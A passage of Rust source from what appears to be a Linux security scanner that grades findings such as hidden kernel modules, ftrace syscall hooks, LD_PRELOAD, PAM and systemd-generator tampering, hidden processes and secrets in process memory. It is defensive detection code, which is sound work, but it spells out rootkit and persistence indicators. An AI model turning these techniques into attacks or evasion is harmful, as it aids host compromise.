                id: "SEC-034",
                source: Scanner::Security,
                title: "Files with capabilities (setcap) – expected".to_string(),
                category: Category::Security,
                weight: 0,
                evidence: format!(
                    "{} file(s) with known capability attributes: {}",
                    suppressed_caps.len(),
                    list
                ),
                suppressed: Some(
                    "These capabilities are expected for standard system tools (e.g. ping, mtr)."
                        .to_string(),
                ),
                cis_ref: None,
            });
        }

        if !active_caps.is_empty() {
            let max_weight = active_caps.iter().map(|(_, w, _)| *w).max().unwrap_or(0);
            let list = active_caps
                .iter()
                .map(|(f, weight, reason)| {
                    format!(
                        "{}: [{}] (weight {}, {})",
                        f.path,
                        f.capabilities.join(", "),
                        weight,
                        reason
                    )
                })
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
                id: "SEC-036",
                source: Scanner::Security,
                title: "Unexpected file capabilities (setcap) – review required".to_string(),
                category: Category::Security,
                weight: max_weight,
                evidence: format!(
                    "{} file(s) with unexpected or unknown capability attributes: {}",
                    active_caps.len(),
                    list
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
    }

    let setuid_files = &report.security.setuid_files;
    if !setuid_files.is_empty() {
        let mut suppressed_su = Vec::new();
        let mut active_su = Vec::new();

        for f in setuid_files {
            let (weight, reason) = classify_setuid(f, &report.security.provenance_source);
            if weight == 0 {
                suppressed_su.push((f, reason));
            } else {
                active_su.push((f, weight, reason));
            }
        }

        if !suppressed_su.is_empty() {
            let list = suppressed_su
                .iter()
                .map(|(f, reason)| {
                    format!(
                        "{} (suid:{}, sgid:{}) — {}",
                        f.path, f.setuid, f.setgid, reason
                    )
                })
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
                id: "SEC-037",
                source: Scanner::Security,
                title: "Setuid/setgid files – expected".to_string(),
                category: Category::Security,
                weight: 0,
                evidence: format!(
                    "{} file(s) with expected setuid/setgid bits: {}",
                    suppressed_su.len(),
                    list
                ),
                suppressed: Some(
                    "These setuid/setgid binaries are owned by known packages or in standard system directories."
                        .to_string(),
                ),
                cis_ref: None,
            });
        }

        if !active_su.is_empty() {
            let max_weight = active_su.iter().map(|(_, w, _)| *w).max().unwrap_or(0);
            let list = active_su
                .iter()
                .map(|(f, weight, reason)| {
                    format!(
                        "{} (suid:{}, sgid:{}) weight {}: {}",
                        f.path, f.setuid, f.setgid, weight, reason
                    )
                })
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
                id: "SEC-037",
                source: Scanner::Security,
                title: "Unexpected setuid/setgid files – review required".to_string(),
                category: Category::Security,
                weight: max_weight,
                evidence: format!(
                    "{} file(s) with unexpected setuid/setgid bits: {}",
                    active_su.len(),
                    list
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
    }

    let ebpf = &report.security.ebpf_inventory;
    let total = ebpf.programs.len() + ebpf.maps.len() + ebpf.links.len() + ebpf.pins.len();
    if total > 0 {
        findings.push(Finding {
            id: "SEC-035",
            source: Scanner::Security,
            title: "eBPF programs, maps, links, and pins (informational)".to_string(),
            category: Category::Security,
            weight: 0,
            evidence: format!(
                "{} BPF programs, {} maps, {} links (active attachments), {} pinned objects (total: {})",
                ebpf.programs.len(),
                ebpf.maps.len(),
                ebpf.links.len(),
                ebpf.pins.len(),
                total
            ),
            suppressed: Some(
                "Routine systemd/container BPF usage is expected. Review unknown programs manually."
                    .to_string(),
            ),
            cis_ref: None,
        });
    }

    {
        let taint = &report.security.kernel_taint;
        let has = |c: char| taint.flags.iter().any(|f| f.code == c);

        let forced = has('F') || has('R') || has('N');
        let unsigned_or_oot = has('E') || has('O');
        let hidden = !report.security.kernel_modules.hidden_candidates.is_empty();

        let flags_str = taint
            .flags
            .iter()
            .filter(|f| f.security_relevant || f.code == 'O')
            .map(|f| format!("{} ({})", f.name, f.code))
            .collect::<Vec<_>>()
            .join(", ");

        if forced || (unsigned_or_oot && hidden) {
            let (weight, note) = if unsigned_or_oot && hidden {
                (
                    25,
                    " CORRELATED with a module hidden from /proc/modules (SEC-040) — strong LKM-rootkit signal.",
                )
            } else {
                (
                    10,
                    " Force-loaded/-unloaded or test module — unusual on a server.",
                )
            };
            findings.push(Finding {
                id: "SEC-038",
                source: Scanner::Security,
                title: "Kernel taint indicates module tampering".to_string(),
                category: Category::Security,
                weight,
                evidence: format!(
                    "/proc/sys/kernel/tainted = {}: {}.{}",
                    taint.raw, flags_str, note
                ),
                suppressed: None,
                cis_ref: None,
            });
        } else if unsigned_or_oot {
            findings.push(Finding {
                id: "SEC-038",
                source: Scanner::Security,
                title: "Kernel tainted by unsigned/out-of-tree module (informational)".to_string(),
                category: Category::Security,
                weight: 0,
                evidence: format!("/proc/sys/kernel/tainted = {}: {}", taint.raw, flags_str),
                suppressed: Some(
                    "Unsigned or out-of-tree modules are normal for third-party drivers \
                     (nvidia, dkms, virtualbox). This escalates to a weighted finding only when \
                     correlated with a hidden module (SEC-040) or when it appears as drift."
                        .to_string(),
                ),
                cis_ref: None,
            });
        }
    }

    {
        let c = &report.security.confinement;

        if c.selinux_permissive {
            findings.push(Finding {
                id: "SEC-039",
                source: Scanner::Security,
                title: "SELinux running in permissive mode (not enforcing)".to_string(),
                category: Category::Security,
                weight: 15,
                evidence: "SELinux is loaded but in permissive mode — policy violations are \
                           logged, not blocked."
                    .to_string(),
                suppressed: None,
                cis_ref: None,
            });
        }

        if !c.complain_profiles.is_empty() {
            let list = c
                .complain_profiles
                .iter()
                .map(|p| format!("{} (pid {}, profile {})", p.comm, p.pid, p.profile))
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
                id: "SEC-039",
                source: Scanner::Security,
                title: "AppArmor profiles in complain mode (informational)".to_string(),
                category: Category::Security,
                weight: 0,
                evidence: format!(
                    "{} profile(s) defined but not enforcing: {}",
                    c.complain_profiles.len(),
                    list
                ),
                suppressed: Some(
                    "Complain mode is frequently an intentional baseline for services whose \
                     vendor profile is too strict (e.g. named/BIND under a control panel). A \
                     regression from enforce→complain is surfaced as drift by `compare`."
                        .to_string(),
                ),
                cis_ref: None,
            });
        }
    }

    {
        let inv = &report.security.kernel_modules;
        if !inv.hidden_candidates.is_empty() {
            let list = inv
                .hidden_candidates
                .iter()
                .map(|h| format!("{} (seen in {})", h.name, h.seen_in.join("+")))
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
                id: "SEC-040",
                source: Scanner::Security,
                title: "ACTIVE COMPROMISE: kernel module hidden from /proc/modules".to_string(),
                category: Category::Security,
                weight: 55,
                evidence: format!(
                    "{} module(s) live in sysfs/kallsyms but scrubbed from /proc/modules \
                     (module_list unlink — Diamorphine-class LKM rootkit): {}",
                    inv.hidden_candidates.len(),
                    list
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
    }

    {
        let inv = &report.security.ftrace_hooks;
        if !inv.live_tracer_active && !inv.unattributed_syscall_hooks.is_empty() {
            let hidden: std::collections::HashSet<&str> = report
                .security
                .kernel_modules
                .hidden_candidates
                .iter()
                .map(|h| h.name.as_str())
                .collect();
            let describe = |hooks: &[&crate::models::FtraceHook]| {
                hooks
                    .iter()
                    .map(|h| format!("{} (via {})", h.function, h.callback))
                    .collect::<Vec<_>>()
                    .join("; ")
            };
            let all: Vec<&crate::models::FtraceHook> =
                inv.unattributed_syscall_hooks.iter().collect();
            let correlated: Vec<&crate::models::FtraceHook> = all
                .iter()
                .copied()
                .filter(|h| {
                    h.callback
                        .strip_prefix("module:")
                        .is_some_and(|m| hidden.contains(m))
                })
                .collect();
            let module_backed = all
                .iter()
                .any(|h| h.callback.starts_with("module:") && !h.callback.contains("unresolved"));

            if !correlated.is_empty() {
                findings.push(Finding {
                    id: "SEC-041",
                    source: Scanner::Security,
                    title: "ACTIVE COMPROMISE: syscall ftrace-hooked by a hidden module"
                        .to_string(),
                    category: Category::Security,
                    weight: 55,
                    evidence: format!(
                        "{} syscall entry point(s) ftrace-hooked by a module hidden from \
                         /proc/modules (SEC-040 correlated — ftrace-rootkit): {}",
                        correlated.len(),
                        describe(&correlated)
                    ),
                    suppressed: None,
                    cis_ref: None,
                });
            } else if inv.attribution_degraded && !module_backed {
                findings.push(Finding {
                    id: "SEC-041",
                    source: Scanner::Security,
                    title: "Unattributed ftrace hooks on syscalls (attribution degraded)".to_string(),
                    category: Category::Security,
                    weight: 0,
                    evidence: format!(
                        "{} syscall entry point(s) carry an ftrace_ops whose callback could not \
                         be resolved (kptr_restrict): {}",
                        all.len(),
                        describe(&all)
                    ),
                    suppressed: Some(
                        "kptr_restrict hides the ftrace callback, so a legitimate BPF/kprobe source \
                         cannot be ruled out. Lower kptr_restrict for attribution, or rely on drift \
                         (a NEW hook between snapshots is weighted regardless)."
                            .to_string(),
                    ),
                    cis_ref: None,
                });
            } else {
                findings.push(Finding {
                    id: "SEC-041",
                    source: Scanner::Security,
                    title: "Unexplained ftrace hook on a syscall entry point".to_string(),
                    category: Category::Security,
                    weight: 30,
                    evidence: format!(
                        "{} syscall entry point(s) ftrace-hooked with no BPF/kprobe/livepatch source \
                         and no active tracer — verify the owning module (EDR?) or investigate: {}",
                        all.len(),
                        describe(&all)
                    ),
                    suppressed: None,
                    cis_ref: None,
                });
            }
        }
    }

    {
        let mut pre_volatile: Vec<String> = Vec::new();
        let mut pre_unverifiable: Vec<String> = Vec::new();
        let mut pre_mapped: Vec<String> = Vec::new();
        let mut pre_unmapped: Vec<String> = Vec::new();

        for f in &report.security.preload_injections {
            let mapped = f.mapped_by_pids.map_or("?".to_string(), |n| n.to_string());
            if f.volatile {
                pre_volatile.push(f.path.clone());
            } else if f.package.is_none()
                && report.security.provenance_source == ProvenanceSource::Unavailable
            {
                pre_unverifiable.push(f.path.clone());
            } else if f.package.is_none() {
                if f.mapped_by_pids.is_some_and(|n| n > 0) {
                    pre_mapped.push(format!("{} (mapped by {mapped})", f.path));
                } else {
                    pre_unmapped.push(format!("{} (mapped by {mapped})", f.path));
                }
            }
        }

        if !pre_volatile.is_empty() || !pre_mapped.is_empty() {
            let weight = if !pre_volatile.is_empty() { 60 } else { 55 };
            let mut entries = pre_volatile;
            entries.append(&mut pre_mapped);
            findings.push(Finding {
                id: "SEC-042",
                source: Scanner::Persistence,
                title: "ACTIVE COMPROMISE: system-wide LD_PRELOAD injected".into(),
                category: Category::Security,
                weight,
                evidence: format!(
                    "{} entr(ies) in /etc/ld.so.preload: {}",
                    entries.len(),
                    evidence_list(&entries, 10)
                ),
                suppressed: None,
                cis_ref: None,
            });
        }

        if !pre_unmapped.is_empty() {
            findings.push(Finding {
                id: "SEC-050",
                source: Scanner::Persistence,
                title: "System-wide LD_PRELOAD injected (unpackaged, not yet mapped)".into(),
                category: Category::Security,
                weight: 30,
                evidence: format!(
                    "{} entr(ies): {}",
                    pre_unmapped.len(),
                    evidence_list(&pre_unmapped, 10)
                ),
                suppressed: None,
                cis_ref: None,
            });
        }

        if !pre_unverifiable.is_empty() {
            findings.push(Finding {
                id: "SEC-049",
                source: Scanner::Persistence,
                title: "System-wide LD_PRELOAD present (ownership unverifiable)".into(),
                category: Category::Security,
                weight: 20,
                evidence: format!(
                    "{} entr(ies) in /etc/ld.so.preload; package database unavailable: {}",
                    pre_unverifiable.len(),
                    evidence_list(&pre_unverifiable, 10)
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
    }

    if !report.security.ld_so_conf_injections.is_empty() {
        let list: Vec<String> = report
            .security
            .ld_so_conf_injections
            .iter()
            .map(|f| {
                format!(
                    "{} (uid {}, mode {:o}, volatile:{})",
                    f.path,
                    f.uid,
                    f.mode.unwrap_or(0),
                    f.volatile
                )
            })
            .collect();
        findings.push(Finding {
            id: "SEC-051",
            source: Scanner::Persistence,
            title: "ld.so.conf paths allow unprivileged library injection".into(),
            category: Category::Security,
            weight: 30,
            evidence: evidence_list(&list, 10),
            suppressed: None,
            cis_ref: None,
        });
    }

    #[cfg(feature = "local-scan")]
    {
        use crate::scanners::generators::{
            GeneratorVerdict, classify_generator, describe, is_volatile_escape,
        };

        let (mut ioc, mut unpackaged, mut unverifiable) = (Vec::new(), Vec::new(), Vec::new());

        for g in &report.security.generators {
            let escape = g.resolved_path.as_deref().is_some_and(is_volatile_escape);
            match classify_generator(
                g.kind,
                g.origin,
                g.writability,
                escape,
                g.package.as_deref(),
                report.security.provenance_source,
            ) {
                GeneratorVerdict::Ioc => ioc.push(describe(g)),
                GeneratorVerdict::Unpackaged => unpackaged.push(describe(g)),
                GeneratorVerdict::Unverifiable => unverifiable.push(describe(g)),
                GeneratorVerdict::Benign => {}
            }
        }

        if !ioc.is_empty() {
            findings.push(Finding {
                id: "SEC-052",
                source: Scanner::Persistence,
                title: "ACTIVE COMPROMISE: systemd generator controlled by a non-root principal"
                    .to_string(),
                category: Category::Security,
                weight: 55,
                evidence: format!(
                    "{} generator target(s) executed as root at every boot and daemon-reload, \
                     writable by non-root or resolving off the systemd hierarchy: {}",
                    ioc.len(),
                    evidence_list(&ioc, 10)
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
        if !unpackaged.is_empty() {
            findings.push(Finding {
                id: "SEC-053",
                source: Scanner::Persistence,
                title: "Unpackaged systemd generator outside the vendor hierarchy".to_string(),
                category: Category::Security,
                weight: 30,
                evidence: format!(
                    "{} generator(s) belong to no installed package and do not live in \
                     /usr/lib/systemd/*-generators: {}",
                    unpackaged.len(),
                    evidence_list(&unpackaged, 10)
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
        if !unverifiable.is_empty() {
            findings.push(Finding {
                id: "SEC-054",
                source: Scanner::Persistence,
                title: "systemd generator present (origin or target unverifiable)".to_string(),
                category: Category::Security,
                weight: 20,
                evidence: format!(
                    "{} non-vendor generator(s); package database unavailable — origin \
                     cannot be verified: {}",
                    unverifiable.len(),
                    evidence_list(&unverifiable, 10)
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
    }

    {
        use crate::models::{ExecWritability, PamTargetKind};
        let (mut ioc, mut unpackaged, mut unverifiable) = (Vec::new(), Vec::new(), Vec::new());
        for f in &report.security.pam_injections {
            let services_count = f.services.len();
            let services_str = if services_count <= 3 {
                f.services.join(", ")
            } else {
                let first_three = f
                    .services
                    .iter()
                    .take(3)
                    .cloned()
                    .collect::<Vec<_>>()
                    .join(", ");
                format!("{first_three}...")
            };
            let evidence = if services_count <= 3 {
                format!(
                    "{} ({} service{}): — used by: {}",
                    f.module.module_path,
                    services_count,
                    if services_count == 1 { "" } else { "s" },
                    services_str
                )
            } else {
                format!(
                    "{} ({} services): — used by: {}",
                    f.module.module_path, services_count, services_str
                )
            };

            if f.target_kind == PamTargetKind::Config && f.writability != ExecWritability::RootOnly
            {
                ioc.push(evidence);
                continue;
            }

            match f.writability {
                ExecWritability::NonRootWritable => ioc.push(evidence),
                ExecWritability::Missing if f.parent_takeable => ioc.push(evidence),
                ExecWritability::Missing => {}
                ExecWritability::Unknown => unverifiable.push(evidence),
                _ => {
                    if f.volatile {
                        ioc.push(evidence);
                    } else if f.package.is_none() {
                        unpackaged.push(evidence);
                    }
                }
            }
        }

        if !ioc.is_empty() {
            findings.push(Finding {
                id: "SEC-055",
                source: Scanner::Persistence,
                title: "ACTIVE COMPROMISE: PAM module/config writable or volatile (authentication bypass)"
                    .to_string(),
                category: Category::Security,
                weight: 55,
                evidence: format!("{} PAM line(s): {}", ioc.len(), evidence_list(&ioc, 10)),
                suppressed: None,
                cis_ref: None,
            });
        }
        if !unpackaged.is_empty() {
            findings.push(Finding {
                id: "SEC-056",
                source: Scanner::Persistence,
                title: "Unpackaged PAM module outside trusted directories".to_string(),
                category: Category::Security,
                weight: 30,
                evidence: format!(
                    "{} PAM line(s): {}",
                    unpackaged.len(),
                    evidence_list(&unpackaged, 10)
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
        if !unverifiable.is_empty() {
            findings.push(Finding {
                id: "SEC-057",
                source: Scanner::Persistence,
                title: "PAM module present (ownership unverifiable)".to_string(),
                category: Category::Security,
                weight: 20,
                evidence: format!(
                    "{} PAM line(s): {}",
                    unverifiable.len(),
                    evidence_list(&unverifiable, 10)
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
    }

    {
        use crate::models::ExecWritability as W;
        let inj = &report.security.exec_start_injections;

        let sel = |p: &dyn Fn(&crate::models::ExecStartFinding) -> bool| -> Vec<String> {
            inj.iter()
                .filter(|f| p(f))
                .map(|f| format!("{} → {}", f.source, f.exec_path))
                .collect()
        };

        let live_rogue = sel(&|f| {
            f.volatile
                && matches!(f.writability, W::RootOnly | W::NonRootWritable)
                && !unit_is_vendor_shipped(f)
        });
        if !live_rogue.is_empty() {
            findings.push(Finding {
                id: "SEC-043",
                source: Scanner::Persistence,
                title: "ACTIVE COMPROMISE: unpackaged unit executes a live target on tmpfs".into(),
                category: Category::Security,
                weight: 55,
                evidence: format!(
                    "{} entr(ies) where an unpackaged unit/cron file points at an EXISTING \
                     executable on a volatile filesystem: {}",
                    live_rogue.len(),
                    evidence_list(&live_rogue, 10)
                ),
                suppressed: None,
                cis_ref: None,
            });
        }

        let live_vendor = sel(&|f| {
            f.volatile
                && matches!(f.writability, W::RootOnly | W::NonRootWritable)
                && unit_is_vendor_shipped(f)
        });
        if !live_vendor.is_empty() {
            findings.push(Finding {
                id: "SEC-047",
                source: Scanner::Persistence,
                title: "Vendor unit executes from a runtime-provisioned path".into(),
                category: Category::Security,
                weight: 0,
                evidence: format!(
                    "{} entr(ies): {}",
                    live_vendor.len(),
                    evidence_list(&live_vendor, 10)
                ),
                suppressed: Some(
                    "The unit file belongs to an installed package and the target is placed on \
                     tmpfs by the runtime by design (LXD/Incus agent, cloud-init, dracut). \
                     A change of unit provenance is surfaced as drift by `compare`."
                        .into(),
                ),
                cis_ref: None,
            });
        }

        let dormant: Vec<&crate::models::ExecStartFinding> = inj
            .iter()
            .filter(|f| f.volatile && f.writability == W::Missing)
            .collect();
        if !dormant.is_empty() {
            let rogue = dormant.iter().any(|f| !unit_is_vendor_shipped(f));
            let list = dormant
                .iter()
                .filter(|f| !rogue || !unit_is_vendor_shipped(f))
                .map(|f| format!("{} → {}", f.source, f.exec_path))
                .collect::<Vec<_>>();
            findings.push(Finding {
                id: "SEC-048",
                source: Scanner::Persistence,
                title: "Unit references a volatile path that does not exist".into(),
                category: Category::Security,
                weight: if rogue { 20 } else { 0 },
                evidence: format!(
                    "{} dormant entr(ies): {}",
                    dormant.len(),
                    evidence_list(&list, 10)
                ),
                suppressed: (!rogue).then(|| {
                    "All declaring units are package-owned: this is the standard \
                     runtime-provisioned agent pattern on a host where that runtime is not \
                     active (e.g. lxd-agent.service on a VM not managed by LXD). Nothing is \
                     executing — the target is absent."
                        .into()
                }),
                cis_ref: None,
            });
        }

        let weak = sel(&|f| f.runs_as_root && !f.volatile && f.writability == W::NonRootWritable);
        if !weak.is_empty() {
            findings.push(Finding {
                id: "SEC-046",
                source: Scanner::Persistence,
                title: "Root-executed unit/cron target is writable by a non-root principal".into(),
                category: Category::Security,
                weight: 25,
                evidence: format!(
                    "{} entr(ies) where the executable or its parent directory is non-root-owned \
                     or group/other-writable — anyone with that access controls what root runs: {}",
                    weak.len(),
                    evidence_list(&weak, 10)
                ),
                suppressed: None,
                cis_ref: None,
            });
        }

        // Side effect removed; moved to warn_evaluate_side_effects.
        // Only forming finding SEC-045 here.
        let unpackaged =
            sel(&|f| !f.volatile && f.writability == W::RootOnly && f.package.is_none());
        if !unpackaged.is_empty() {
            findings.push(Finding {
                id: "SEC-045",
                source: Scanner::Persistence,
                title: "Unit/cron targets with no package owner (inventory)".into(),
                category: Category::Security,
                weight: 0,
                evidence: format!(
                    "{} root-owned target(s) unresolved: {}",
                    unpackaged.len(),
                    evidence_list(&unpackaged, 10)
                ),
                suppressed: Some(
                    "Root-owned, non-writable and outside any volatile filesystem: only root \
                     could have placed these. Package databases miss locally built software, \
                     vendor packages and alternatives symlinks, so absence of an owner is not \
                     evidence. A target that BECOMES unpackaged between snapshots is surfaced \
                     as drift by `compare`."
                        .into(),
                ),
                cis_ref: None,
            });
        }
    }

    if let Some(cp) = report.security.core_pattern.as_deref()
        && !core_pattern_is_trusted(cp)
    {
        findings.push(Finding {
            id: "SEC-044",
            source: Scanner::Persistence,
            title: "Suspicious core_pattern (piped to unknown handler)".to_string(),
            category: Category::Security,
            weight: 25,
            evidence: format!("core_pattern = {}", cp),
            suppressed: None,
            cis_ref: None,
        });
    }

    if let Some(ref lock) = report.security.lockdown
        && lock == "none"
    {
        findings.push(Finding {
            id: "SEC-044",
            source: Scanner::Persistence,
            title: "Kernel lockdown is inactive".to_string(),
            category: Category::Security,
            weight: 0,
            evidence: "lockdown = none".to_string(),
            suppressed: Some(
                "Kernel lockdown is not enabled. Consider setting lockdown=integrity \
                 in kernel command line to restrict userspace access to kernel memory."
                    .to_string(),
            ),
            cis_ref: None,
        });
    }

    if !jit_advisories.is_empty() {
        let mut by_process = std::collections::HashMap::new();
        for adv in &jit_advisories {
            let key = format!("{} (pid {})", adv.process, adv.pid);
            *by_process.entry(key).or_insert(0usize) += 1;
        }

        let list = by_process
            .into_iter()
            .map(|(proc, count)| format!("{}: {} JIT regions", proc, count))
            .collect::<Vec<_>>()
            .join("; ");

        findings.push(Finding {
            id: "SEC-027",
            source: Scanner::Security,
            title: "Writable JIT code cache — hardening opportunity".to_string(),
            category: Category::Security,
            weight: 0,
            evidence: format!(
                "{} process(es) using writable JIT arenas: {}",
                jit_advisories.len(),
                list
            ),
            suppressed: Some(
                "JIT topology verified; structural pattern matches expected runtime behavior."
                    .to_string(),
            ),
            cis_ref: None,
        });
    }

    if !report.security.ghost_pids.is_empty() {
        let describe = |g: &crate::models::GhostPidFinding| {
            let st = g.state.as_deref().unwrap_or("?");
            let age = g
                .age_secs
                .map(|a| format!("{a}s"))
                .unwrap_or_else(|| "age?".to_string());
            let sock = if g.holds_socket { ", holds socket" } else { "" };
            format!(
                "pid {} (state {st}, {age}, via {}{sock})",
                g.pid, g.confirmed_via
            )
        };

        let (hard, soft): (Vec<_>, Vec<_>) = report
            .security
            .ghost_pids
            .iter()
            .partition(|g| g.confirmed_ioc);

        if !hard.is_empty() {
            let list = hard
                .iter()
                .map(|g| describe(g))
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
                id: "SEC-024",
                source: Scanner::Security,
                title: "ACTIVE COMPROMISE: Hidden process (LKM rootkit) detected".to_string(),
                category: Category::Security,
                weight: 60,
                evidence: format!(
                    "{} PID(s) live but hidden from /proc listing: {}",
                    hard.len(),
                    list
                ),
                suppressed: None,
                cis_ref: None,
            });
        }

        if !soft.is_empty() {
            let list = soft
                .iter()
                .map(|g| describe(g))
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
                id: "SEC-025",
                source: Scanner::Security,
                title: "Suspicious transient PID visibility mismatch".to_string(),
                category: Category::Security,
                weight: 20,
                evidence: format!(
                    "{} PID(s) with a readdir/stat mismatch, downgraded (young or unconfirmable): {}",
                    soft.len(),
                    list
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
    }

    if let Some(_critical) = report
        .host
        .cron_jobs
        .iter()
        .find(|c| c.severity == CronSeverity::Critical)
    {
        let critical_jobs: Vec<&str> = report
            .host
            .cron_jobs
            .iter()
            .filter(|c| c.severity == CronSeverity::Critical)
            .map(|c| c.command.as_str())
            .collect();

        findings.push(Finding {
            id: "SEC-018",
            source: Scanner::Host,
            title: "Suspicious cron job detected (possible persistence)".to_string(),
            category: Category::Security,
            weight: 20,
            evidence: format!(
                "{} suspicious cron job(s): {}",
                critical_jobs.len(),
                critical_jobs.join("; ")
            ),
            suppressed: None,
            cis_ref: Some("CIS 5.1.8"),
        });
    }

    // R27-25: secrets found in the scanner's own environment are a hygiene
    // issue of the scanner, not of the host. Never hidden (Raw Truth), but
    // never weighted against the host.
    let (self_leaks, host_leaks): (Vec<_>, Vec<_>) = report
        .security
        .secret_hygiene
        .iter()
        .partition(|l| l.self_attributed.is_some());

    if !host_leaks.is_empty() {
        let mut evidence_list = Vec::new();
        for leak in host_leaks.iter().take(3) {
            evidence_list.push(format!(
                "'{}' in {} of {} (pid {})",
                leak.matched_key, leak.source, leak.process, leak.pid
            ));
        }
        let mut evidence_str = evidence_list.join(", ");
        if host_leaks.len() > 3 {
            evidence_str.push_str(&format!(" and {} more...", host_leaks.len() - 3));
        }

        findings.push(Finding {
            id: "SEC-014",
            source: Scanner::Security,
            title: "Cleartext secrets exposed in process memory".to_string(),
            category: Category::Security,
            weight: 25,
            evidence: format!("Found {} leak(s): {}", host_leaks.len(), evidence_str),
            suppressed: None,
            cis_ref: None,
        });
    }

    if !self_leaks.is_empty() {
        findings.push(Finding {
            id: "SEC-058",
            source: Scanner::Security,
            title: "Scanner's own process carries a secret in its environment".to_string(),
            category: Category::Security,
            weight: 0, // informational only
            evidence: format!(
                "{} key(s) in owlzops-mapper's own environ/cmdline: {}. The startup \
                 scrub (R27-13) only removes OWLZOPS_SUDO_PASS; anything else was \
                 inherited from the invoking shell.",
                self_leaks.len(),
                self_leaks
                    .iter()
                    .map(|l| l.matched_key.as_str())
                    .collect::<Vec<_>>()
                    .join(", ")
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    let cap_findings: Vec<&crate::models::ProcCapFinding> = report
        .security
        .capability_audit
        .iter()
        .filter(|f| !f.critical_caps.is_empty())
        .collect();
    if !cap_findings.is_empty() {
        let n = cap_findings.len();
        let nnp_open = cap_findings
            .iter()
            .filter(|f| f.no_new_privs == Some(false))
            .count();

        let ports = &report.network.listening_ports;
        let (listening, exposed) = cap_findings.iter().fold((0usize, 0usize), |(l, e), f| {
            let pid = Some(f.pid);
            let mut on_net = false;
            let mut global = false;
            for p in ports {
                if p.pid == pid {
                    on_net = true;
                    if crate::utils::is_wildcard_bind(&p.bind_address) {
                        global = true;
                        break;
                    }
                }
            }
            (l + on_net as usize, e + global as usize)
        });

        let mut evidence = format!(
            "{n} non-root process(es) with SYS_ADMIN/SYS_PTRACE/DAC_OVERRIDE/NET_RAW capability sets"
        );
        if nnp_open > 0 {
            evidence.push_str(&format!(
                "; {nnp_open} of them with NoNewPrivs=0 — setuid execve escalation path open"
            ));
        }
        if listening > 0 {
            if exposed > 0 {
                evidence.push_str(&format!(
                    "; WARNING: {listening} of these listening on the network ({exposed} exposed globally on 0.0.0.0/::)"
                ));
            } else {
                evidence.push_str(&format!(
                    "; WARNING: {listening} of these listening on the network (none exposed globally)"
                ));
            }
        }

        let weight = if exposed > 0 { 20 } else { 8 };

        findings.push(Finding {
            id: "CAP-001",
            source: Scanner::Security,
            title: "Non-root processes hold critical kernel capabilities".to_string(),
            category: Category::Security,
            weight,
            evidence,
            suppressed: None,
            cis_ref: None,
        });
    }

    let ambient_findings: Vec<&crate::models::ProcCapFinding> = report
        .security
        .capability_audit
        .iter()
        .filter(|f| {
            f.reason
                .as_ref()
                .is_some_and(|r| *r == crate::models::CapReason::AmbientCapsNoNewPrivs)
        })
        .collect();
    if !ambient_findings.is_empty() {
        let describe = |f: &crate::models::ProcCapFinding| {
            format!(
                "{} (pid {}, euid {}): ambient [{}]",
                f.comm,
                f.pid,
                f.euid,
                crate::scanners::capabilities::decode_mask(f.ambient).join(", ")
            )
        };
        let (active, benign): (Vec<_>, Vec<_>) = ambient_findings
            .into_iter()
            .partition(|f| ambient_escalation_weight(f.ambient) > 0);

        if !active.is_empty() {
            let max_weight = active
                .iter()
                .map(|f| ambient_escalation_weight(f.ambient))
                .max()
                .unwrap_or(0);
            let list = active
                .iter()
                .map(|&f| describe(f))
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
                id: "CAP-002",
                source: Scanner::Security,
                title: "Escalation-capable ambient capabilities with NoNewPrivs disabled"
                    .to_string(),
                category: Category::Security,
                weight: max_weight,
                evidence: format!(
                    "{} non-root process(es) hold escalation-primitive ambient capabilities \
                     while NoNewPrivs is off — the set survives execve of a non-setuid binary: {}",
                    active.len(),
                    list
                ),
                suppressed: None,
                cis_ref: None,
            });
        }

        if !benign.is_empty() {
            let list = benign
                .iter()
                .map(|&f| describe(f))
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
                id: "CAP-002",
                source: Scanner::Security,
                title: "Benign ambient capabilities (informational)".to_string(),
                category: Category::Security,
                weight: 0,
                evidence: format!(
                    "{} non-root process(es) hold only non-escalation ambient capabilities: {}",
                    benign.len(),
                    list
                ),
                suppressed: Some(
                    "These ambient capabilities are not privilege-escalation primitives and are \
                     commonly granted intentionally via systemd AmbientCapabilities (e.g. a \
                     database holding CAP_IPC_LOCK for memory locking)."
                        .to_string(),
                ),
                cis_ref: None,
            });
        }
    }

    let mut has_mem_limit_issue = false;
    let mut has_cpu_limit_issue = false;
    let mut has_privileged = false;
    let mut has_dangerous_caps = false;

    for container in &report.topology.containers {
        let issues = container.security_issues();
        for issue in issues {
            match issue {
                "NoMemLimit" => has_mem_limit_issue = true,
                "NoCpuLimit" => has_cpu_limit_issue = true,
                "PRIVILEGED" => has_privileged = true,
                "SYS_ADMIN" | "NET_ADMIN" => has_dangerous_caps = true,
                _ => {}
            }
        }
    }

    if has_mem_limit_issue {
        findings.push(Finding {
            id: "DOCK-001",
            source: Scanner::Docker,
            title: "Docker containers without memory limits".to_string(),
            category: Category::Security,
            weight: 5,
            evidence: "At least one container lacks a memory limit".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.3"),
        });
    }
    if has_cpu_limit_issue {
        findings.push(Finding {
            id: "DOCK-002",
            source: Scanner::Docker,
            title: "Docker containers without CPU limits".to_string(),
            category: Category::Security,
            weight: 3,
            evidence: "At least one container lacks a CPU limit".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.2"),
        });
    }
    if has_privileged {
        findings.push(Finding {
            id: "DOCK-003",
            source: Scanner::Docker,
